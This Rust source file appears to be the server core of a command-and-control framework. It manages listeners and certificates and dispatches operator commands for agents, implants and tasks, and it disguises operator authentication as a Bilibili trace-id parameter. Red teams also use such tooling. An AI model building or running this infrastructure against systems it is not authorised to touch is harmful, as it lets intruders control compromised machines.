use axum::{
    extract::connect_info::ConnectInfo,
    extract::ws::{Message, WebSocket, WebSocketUpgrade},
    http::{header::HeaderMap, StatusCode},
    extract::Request,
    middleware::{self, Next},
    response::IntoResponse,
    response::Response,
    routing::get,
    Extension, Router,
};
use axum_extra::TypedHeader;
use log::{error, info, warn};
use std::io::{Error, ErrorKind};
use std::net::SocketAddr;
use std::sync::Arc;
use axum::extract::Query;
use tokio::sync::{broadcast, Mutex, MutexGuard};
use tower_http::{
    add_extension::AddExtensionLayer,
    trace::{DefaultMakeSpan, TraceLayer},
};

use tokio::net::TcpListener;

use super::{
    certs::https::{create_root_ca, create_server_certs},
    crypto::aesgcm,
    db,
    handlers::{
        agent::handle_agent, implant::handle_implant, listener::handle_listener, task::handle_task,
    },
    jobs::{find_job, Job, JobMessage},
    listeners::listener::Listener,
};
use crate::utils::fs::read_json;
use crate::{
    config::Config,
    server::db::DB_PATH,
    utils::fs::{exists_file, mkdir, mkfile},
};

#[derive(Debug)]
pub struct Server {
    pub config: Config,
    pub db: db::DB,
    pub jobs: Arc<Mutex<Vec<Job>>>, // Jobs contain listeners
    pub tx_job: Arc<Mutex<broadcast::Sender<JobMessage>>>,
}


impl Server {

    pub fn new(config: Config, db: db::DB, tx_job: broadcast::Sender<JobMessage>) -> Self {
        Self {
            config,
            db,
            jobs: Arc::new(Mutex::new(Vec::new())),
            tx_job: Arc::new(Mutex::new(tx_job)),
        }
    }


    pub async fn add_listener(
        &mut self,
        name: String,
        hostnames: Vec<String>,
        protocol: String,
        host: String,
        port: u16,
        init: bool,
    ) -> Result<(), Error>
    {
        let _ = mkdir(format!("server/listeners/{}/certs", name.to_string()));


        if protocol == "https" {
            create_server_certs(name.to_string(), hostnames.to_owned(), host.to_string());
        }


        let listener = Listener::new(
            name.to_string(),
            hostnames,
            protocol.to_string(),
            host.to_string(),
            port.to_owned(),
        );


        if !init {
            match db::exists_listener(self.db.path.to_string(), listener.clone()) {
                Ok(exists) => {
                    if exists {
                        return Err(Error::new(ErrorKind::Other, "Listener already exists."));
                    }
                }
                Err(e) => {
                    return Err(Error::new(ErrorKind::Other, e.to_string()));
                }
            }
        }

        // 锁
        let mut jobs_lock = self.jobs.lock().await;
        let rx_job_lock = self.tx_job.lock().await;

        // 创建新的 job
        let new_job = Job::new(
            (jobs_lock.len() + 1) as u32,
            listener.clone(),
            Arc::new(Mutex::new(rx_job_lock.subscribe())),
            self.db.path.to_string(),
        );

        // 将新的 job 添加到 jobs_lock
        jobs_lock.push(new_job);

        // 把 listener 添加到 database
        db::add_listener(self.db.path.to_string(), &listener).unwrap();

        Ok(())
    }

    // 删除监听
    pub async fn delete_listener(&mut self, listener_name: String) -> Result<(), Error> {
        let mut jobs = self.jobs.lock().await;
        let mut jobs_owned = jobs.to_owned();

        let job = match find_job(&mut jobs_owned, listener_name.to_owned()).await {
            Some(j) => j,
            None => {
                return Err(Error::new(ErrorKind::Other, "Listener not found."));
            }
        };

        if job.running {
            return Err(Error::new(
                ErrorKind::Other,
                "Listener cannot be deleted because it's running. Please stop it before deleting.",
            ));
        }

        job.handle.lock().await.abort();
        jobs.remove((job.id - 1) as usize);

        // 从数据库中删除监听
        db::delete_listener(self.db.path.to_string(), job.listener.name.to_string()).unwrap();

        Ok(())
    }

    // 删除所有监听
    pub async fn delete_all_listeners(&mut self) -> Result<(), Error> {
        self.jobs = Arc::new(Mutex::new(Vec::new()));
        db::delete_all_listeners(self.db.path.to_string()).unwrap();
        Ok(())
    }
}

pub async fn run(config: Config, server_port: u16) {
    // 初始化DB结构体
    let db = db::DB::new();
    let db_path = db.path.to_string();

    // 初始化广播通道
    let (tx_job, _rx_job) = broadcast::channel(100);

    // 初始化服务器，使用Arc和Mutex，即多线程共享，互斥锁
    let server = Arc::new(Mutex::new(Server::new(config, db, tx_job)));

    // 从数据库加载数据或初始化
    if exists_file("server/fusion.db".to_string()) {
        // 从数据库中取出已有的 listeners
        let all_listeners = db::get_all_listeners(db_path.to_string()).unwrap();
        if all_listeners.len() > 0 {
            let mut server_lock = server.lock().await;
            for listener in all_listeners {
                let _ = server_lock
                    .add_listener(
                        listener.name,
                        listener.hostnames,
                        listener.protocol,
                        listener.host,
                        listener.port,
                        true,
                    )
                    .await;
            }
        }
    } else {
        mkfile(DB_PATH.to_string()).unwrap();

        // 初始化数据库
        db::init_db(db_path.to_string()).unwrap();
    }

    // 如果根证书尚不存在，请生成根证书。
    if !exists_file("server/root_cert.pem".to_string())
        || !exists_file("server/root_key.pem".to_string())
    {
        let _ = create_root_ca();
    }

    // 如果数据库中尚不存在 kaypair，则生成 kaypair（用于与代理的安全通信）
    let keypair_exists = match db::exists_keypair(db_path.to_string()) {
        Ok(exists) => exists,
        Err(e) => {
            error!("Error: {}", e.to_string());
            return;
        }
    };
    if !keypair_exists {
        let (secret, public) = aesgcm::generate_keypair();
        let encoded_secret = aesgcm::encode(secret.as_bytes());
        let encoded_public = aesgcm::encode(public.as_bytes());

        let _ = db::add_keypair(db_path.to_string(), encoded_secret, encoded_public);
    }

    let app = Router::new()
        .route(read_json("server-config","websocket-url").as_str(), get(ws_handler))
        .layer(AddExtensionLayer::new(server))
        .layer(
            TraceLayer::new_for_http()
                .make_span_with(DefaultMakeSpan::default().include_headers(true)),
        );

    let listener = TcpListener::bind(format!("0.0.0.0:{}", server_port))
        .await
        .unwrap();
    info!("listening on {}", listener.local_addr().unwrap());

    // 启动服务
    axum::serve(
        listener,
        app.into_make_service_with_connect_info::<SocketAddr>(),
    )
    .await
    .unwrap();
}

async fn ws_handler(
    ws: WebSocketUpgrade,
    user_agent: Option<TypedHeader<headers::UserAgent>>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    Extension(server): Extension<Arc<Mutex<Server>>>,
    request: Request,
) -> impl IntoResponse {

    let ws_url = request.uri();

    let query = ws_url.query().unwrap_or("");

    let mut trace_id = None;
    let mut username = None;

    for (key, value) in url::form_urlencoded::parse(query.as_bytes()) {
        match key.as_ref() {
            "x-bili-trace-id" => trace_id = Some(value.to_string()),
            "username" => username = Some(value.to_string()),
            _ => {}
        }
    }

    let x_bili_trace_id = trace_id.unwrap_or_default();
    let username = username.unwrap_or_default();

    if x_bili_trace_id != read_json("server-config","x-bili-trace-id") {
        warn!("Unknown user attempted login");
        return Err(StatusCode::UNAUTHORIZED)
    }

    info!("`{username}` at {addr} connected.");
    Ok(ws.on_upgrade(move |socket| handle_socket(socket, addr, server)))
}

async fn handle_socket(socket: WebSocket, who: SocketAddr, server: Arc<Mutex<Server>>) {
    let socket_arc = Arc::new(Mutex::new(socket));

    loop {
        let socket_clone = Arc::clone(&socket_arc);
        let mut socket_lock = socket_clone.lock().await;

        if let Some(msg) = socket_lock.recv().await {
            if let Ok(msg) = msg {
                handle_message(msg, socket_lock, Arc::clone(&server)).await;
            } else {
                info!("Client {who} abruptly disconnected.");
                return;
            }
        }
    }
}

// 连接后的功能参数和动作
// 客户端发回服务器的消息
async fn handle_message(
    msg: Message,
    mut socket_lock: MutexGuard<'_, WebSocket>,
    server: Arc<Mutex<Server>>,
) {
    match msg {
        Message::Text(text) => {
            let args = match shellwords::split(text.as_str()) {
                Ok(args) => args,
                Err(err) => {
                    error!("Can't parse command line: {err}");
                    // vec!["".to_string()]
                    return;
                }
            };

            match args[0].as_str() {
                "listener" => {
                    handle_listener(args, &mut socket_lock, Arc::clone(&server)).await;
                }
                "agent" => {
                    handle_agent(args, &mut socket_lock, Arc::clone(&server)).await;
                }
                "implant" => {
                    handle_implant(text.to_owned(), args, &mut socket_lock, Arc::clone(&server))
                        .await;
                }
                "task" => {
                    handle_task(text.to_owned(), args, &mut socket_lock, Arc::clone(&server)).await;
                }
                _ => {
                    let _ = socket_lock
                        .send(Message::Text(format!("Unknown command: {text}")))
                        .await;
                    let _ = socket_lock.send(Message::Text("[done]".to_owned())).await;
                }
            }
        }
        _ => {}
    }
}
